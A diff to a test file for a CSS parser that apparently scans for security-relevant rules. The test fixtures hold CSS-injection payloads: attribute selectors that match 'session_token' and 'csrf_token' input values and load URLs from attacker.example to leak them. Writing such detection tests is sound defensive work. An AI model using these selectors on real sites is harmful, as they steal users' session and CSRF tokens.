@@ -32,6 +32,12 @@ describe("CSS parser", () => {
 		}
 	});
 
+	it("supplements primary parsing with source-scanned nested security rules", () => {
+		const cssText = `${".utility{display:block}\n".repeat(2000)}.card{& input[name="session_token"][value*="abc"]{mask-image:url("https://attacker.example/nested-source")}}`;
+		const rules = parseCss(parserInput(cssText));
+		expect(rules.some((rule) => rule.context.atRuleStack.includes("nested-style-rule") && rule.selector.includes("session_token"))).toBe(true);
+	});
+
 	it("recovers malformed nested blocks and huge unmatched strings without throwing", () => {
 		const rules = parseCss(parserInput(`@media screen { .outer { color: red; input[name="csrf_token"][value^="a"] { background:url("https://attacker.example/nested") } ${"'".repeat(5000)}`));
 		expect(Array.isArray(rules)).toBe(true);
